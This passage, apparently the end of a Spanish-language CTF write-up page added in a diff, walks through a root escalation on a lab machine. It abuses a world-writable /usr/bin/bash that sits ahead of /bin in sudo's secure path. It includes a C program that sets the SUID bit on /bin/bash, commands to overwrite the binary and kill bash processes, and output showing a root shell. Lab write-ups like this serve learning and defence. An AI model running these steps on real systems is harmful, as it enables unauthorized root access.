+                <p><code>/bin</code> está al final del path. Si alguno de los directorios anteriores contiene un
+                    binario <code>bash</code> con permisos de escritura, se resolvería primero cuando
+                    <code>sudo</code> ejecute el script. Comprobando <code>/usr/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">ls -lah /usr/bin/bash
+<span style="color:#98c379;">-rwxrwxrwx 1 root root 1.4M Mar 31 2024 /usr/bin/bash</span></code></pre>
+
+                <p><code>/usr/bin/bash</code> tiene permisos de escritura para todos. Como <code>/usr/bin</code> aparece
+                    antes que <code>/bin</code> en el secure path, cualquier llamada a <code>bash</code> dentro del
+                    script ejecutado con sudo resolverá primero a <code>/usr/bin/bash</code>. El plan es reemplazarla
+                    con un binario personalizado que asigne el bit SUID a <code>/bin/bash</code> antes de pasar el
+                    control a la shell real.</p>
+
+                <p>Sobrescribir el binario de la shell que se está usando actualmente desde dentro de ella misma causa
+                    el error "Text file busy". La solución es cambiar primero a <code>sh</code> y luego eliminar
+                    cualquier instancia de <code>bash</code> restante:</p>
+
+                <pre><code class="language-bash">exec /bin/sh
+killall -9 bash</code></pre>
+
+                <p>El flag <code>-9</code> envía <code>SIGKILL</code>, una señal que el proceso no puede capturar ni
+                    ignorar. A continuación, se compila un pequeño programa C en la máquina atacante. Asigna el bit
+                    SUID a <code>/bin/bash</code> y luego hace exec a una copia real de bash (colocada en
+                    <code>/tmp/bash_real</code>) para evitar recursión infinita:</p>
+
+                <pre><code class="language-c"><span style="color:#c678dd;">#include</span> <span style="color:#98c379;">&lt;unistd.h&gt;</span>
+<span style="color:#c678dd;">#include</span> <span style="color:#98c379;">&lt;sys/stat.h&gt;</span>
+
+<span style="color:#e5c07b;">int</span> <span style="color:#61afef;">main</span>(<span style="color:#e5c07b;">int</span> argc, <span style="color:#e5c07b;">char</span> *argv[], <span style="color:#e5c07b;">char</span> *envp[]) {
+    <span style="color:#61afef;">chmod</span>(<span style="color:#98c379;">"/bin/bash"</span>, <span style="color:#d19a66;">04755</span>);
+    <span style="color:#61afef;">execve</span>(<span style="color:#98c379;">"/tmp/bash_real"</span>, argv, envp);
+    <span style="color:#c678dd;">return</span> <span style="color:#d19a66;">0</span>;
+}</code></pre>
+
+                <pre><code class="language-bash">gcc -o bashed xploit.c</code></pre>
+
+                <p>Se transfiere el binario a la máquina víctima, se hace una copia de seguridad de la bash real y se
+                    sobreescribe <code>/usr/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">cp /bin/bash /tmp/bash_real
+cp bashed /usr/bin/bash</code></pre>
+
+                <p>Ahora se triggerea el payload ejecutando el comando sudo permitido con un argumento de plugin
+                    válido:</p>
+
+                <pre><code class="language-bash">sudo /opt/syswatch/syswatch.sh plugin disk_monitor.sh</code></pre>
+
+                <p>El script invoca <code>bash</code> como root, que resuelve al
+                    <code>/usr/bin/bash</code> malicioso, que a su vez asigna el bit SUID a
+                    <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">ls -lah /bin/bash
+<span style="color:#98c379;">-rwsr-xr-x 1 root root 16K Mar 30 14:34 /bin/bash</span></code></pre>
+
+                <p>Finalmente, se obtiene una shell privilegiada con <code>bash -p</code>, que preserva el UID efectivo,
+                    concediendo acceso root y la flag de root:</p>
+
+                <pre><code class="language-bash">bash -p
+<span style="color:#98c379;">bash-5.2#</span> id
+<span style="color:#98c379;">uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) groups=1001(dev_ryan)</span></code></pre>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
